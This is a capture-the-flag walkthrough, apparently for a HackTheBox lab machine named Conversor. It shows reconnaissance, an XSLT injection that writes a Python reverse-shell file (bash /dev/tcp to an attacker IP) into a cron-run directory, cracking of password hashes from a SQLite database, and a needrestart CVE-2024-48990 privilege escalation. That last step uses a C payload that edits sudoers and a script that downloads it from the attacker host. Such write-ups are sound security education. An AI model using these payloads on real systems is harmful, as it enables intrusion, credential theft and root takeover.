## Enumeration
I start with the reconnaissance with `nmap`

```sh
mkdir nmap
nmap -sC -sV -oA nmap/initial 10.10.11.92
```

![](../../../attachments/Pasted%20image%2020251110114833.png)

We see that the server is configured to respond to the name `conversor.htb` rather than the IP address `10.10.11.92`. See to resolve that we have to edit the `/etc/hosts` file and write 
`10.10.11.92  conversor.htb`.

```sh
sudo nano /etc/hosts
```

After that if we type the IP address of the machine to our browser we will be able to see the Web application:

![](../../../attachments/Pasted%20image%2020251110115534.png)

Then we start enumerating the web application with `gobuster` to find common directories and files:

```sh
gobuster dir -u http://conversor.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

![](../../../attachments/Pasted%20image%2020251110121530.png)

We find only standard directories. The only interesting directory is `/convert` which I am assuming I will be able to access once I create an account.

So I go to the register page and I create an account:

![](../../../attachments/Pasted%20image%2020251110121820.png)

and then I am able to login:

![](../../../attachments/Pasted%20image%2020251110121855.png)

I checked the source code of the website and I didn't find anything notable.

If we go to the About page, we find a button to download the source code:

![](../../../attachments/Pasted%20image%2020251110122452.png)

So we download it and then decompress the file:

```sh
tar -xvf source_code.tar.gz
```

![](../../../attachments/Pasted%20image%2020251110122636.png)

If we open the `install.md` we find this line:

![](../../../attachments/Pasted%20image%2020251110124130.png)

So this is a cron job that runs every minute, of every hour, of every day (this is what these `*****` are for). Also it tells me that it runs as the `www-data` user and it loops through every file that is ending in `.py` in the `/var/www/conversor.htb/scripts/` directory. So I begin to think that somehow I have to upload a python file to Remote Code Execution as `www-data` within 60 seconds.

So after searching for the converter feature and XML + XSLT I found this:
XSLT stands for "Extensible Stylesheet Language Transformations" and it is designed to transform one XML document into another format (like HTML). XSLT can include extension functions (EXSLT) that allow file writing or system interactions in some processors. So the `/convert` endpoint accepts user-supplied XSLT files and passes them directly to `lxml.etree.XSLT()` for execution. (I know this by checking the python source code in `app.py`)

So now all I have to do is craft a malicious XSLT (`shell.xslt`) file which is the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
  <xsl:template match="/">
    <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.125/9001 0>&1'")
    </shell:document>
  </xsl:template>
</xsl:stylesheet>
```

![](../../../attachments/Pasted%20image%2020251110133553.png)

but when I tried to upload it, it was throwing an error `Error: xmlParseEntityRef: no name, line 11, column 31 (shell.xslt, line 11)`. That was because XML requires certain characters to be escaped. For example, `&` must be represented as `&amp;`. The error message `xmlParseEntityRef: no name` indicates an unescaped `&` was found in the XSLT, causing the parser to expect an entity reference that wasn’t present.

So what I had to do was to change the `&` symbol to `&amp;` :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
  <xsl:template match="/">
    <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("bash -c 'bash -i >&amp; /dev/tcp/10.10.14.125/9001 0>&amp;1'")
    </shell:document>
  </xsl:template>
</xsl:stylesheet>
```

![](../../../attachments/Pasted%20image%2020251110133832.png)

So I uploaded the `shell.xslt` and a random XML file and then in my attacking machine I used netcat to listen on port 9001

```sh
nc -lvnp 9001
```

and after one minute I got a shell:

![](../../../attachments/Pasted%20image%2020251110134046.png)

So we traverse in order to find the database `users.db`

![](../../../attachments/Pasted%20image%2020251110134907.png)

So now in order to see the database, we type:
```sh
sqlite3 users.db

#THEN to find the tables
.tables
files users

.schema users
CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT );

select * from users;
```


![](../../../attachments/Pasted%20image%2020251110135133.png)

![](../../../attachments/Pasted%20image%2020251110135157.png)

![](../../../attachments/Pasted%20image%2020251110135225.png)

So we need to crack one of those passwords, so we take the hashes and write them in the attacking machine in the file `hashes.txt` and then using `hashcat` we try to crack them.

```sh
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

and after a while we get the passwords:

![](../../../attachments/Pasted%20image%2020251110140415.png)

and then all we have to do is ssh into the user `fismathack` and get the user flag:


![](../../../attachments/Pasted%20image%2020251110141128.png)

## Privilege Escalation

Firstly, we type `sudo -l` to find what we can run as `sudo`:

![](../../../attachments/Pasted%20image%2020251110172214.png)

so we can run `needrestart` as root without supplying a password.

![](../../../attachments/Pasted%20image%2020251110172427.png)

We also check to find the version of `needstart` and it is the version 3.7. After a lot of research on the Internet, I found the following information:
- `needstart` is a tool installed by default on Ubuntu server since version 21.04 and it probes the system to see if either the system itself or some of its services should be restarted. A service is considered as needing to be restarted if one of its processes is using a shared library whose initial file isn't on the system anymore (for example, if it has been overwritten by a new version as part of a package update).
- Qualys Security Advisory found 4 different vulnerabilities in `needrestart` but we will be focusing on the `CVE-2024-48990` in which local attackers can execute arbitrary code as root by tricking `needrestart` into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.

#### CVE-2024-48990
In `needstart`, whenever a Python process needs to be restarted, `needstart` extracts the PYTHONPATH environment variable from this process's `/proc/pid/environ`, sets this environment variable if it exists and executes Python. If a Python process belongs to a local attacker, then `needstart` executes Python with an attacker-controlled PYTHONPATH environment variable, which allows the attacker to execute arbitrary code as root.

So searching the Internet for ways to make it work, I found this solution which worked. (NOTE: At first I found some code on GitHub but the target machine does not have a C compiler, so any exploit components requiring native compilation would need to be built externally and then, transported to the target).

First, we write this C program `lib.c`:
```c
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h>  
  
static void a() __attribute__((constructor));  
  
void a() {  
if (geteuid() == 0) { // Only execute if we're running with root privileges  
setuid(0);  
setgid(0);  
const char *shell = "cp /bin/sh /tmp/poc; "  
"chmod u+s /tmp/poc; "  
"grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "  
"echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";  
system(shell);  
}  
}
```

Then we compile the `lib.c` as a 64-bit shared object (`.so`) file:
```c
gcc -shared -fPIC -o __init__.so lib.c
```

Lastly, we create the `start.sh` which we will run on the victim as the `fismathack` use.

```sh
#!/bin/bash  
set -e  
cd /tmp  
mkdir -p malicious/importlib  
  
#chage to your ip and open python http server  
curl http://10.10.14.125:8004/__init__.so -o /tmp/malicious/importlib/__init__.so  
  
# Minimal Python script to trigger import  
cat << 'EOF' > /tmp/malicious/e.py  
import time  
while True:  
try:  
import importlib  
except:  
pass  
if __import__("os").path.exists("/tmp/poc"):  
print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")  
__import__("os").system("sudo /tmp/poc -p")  
break  
time.sleep(1)  
EOF  
  
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

After all that we need to deliver the payload `start.sh` to the target, so we start a Python server on port 8004 on our attacking machine:
```python
python3 -m http.server 8004
```

On the target machine, we get the `start.sh` payload with a `wget`:

```sh
wget http://10.10.14.125:8004/start.sh
```

```sh
chmod +x start.sh
./start.sh
```

![](../../../attachments/Pasted%20image%2020251110175715.png)
![](../../../attachments/Pasted%20image%2020251110175902.png)
The program waits for us to use the `needrestart` command in order to work, so we open another terminal, we `ssh` to `fismathack` again and then we type:
```sh
sudo /usr/sbin/needrestart
```
and then we get a root shell, and we get the root flag!!!

![](../../../attachments/Pasted%20image%2020251110154042.png)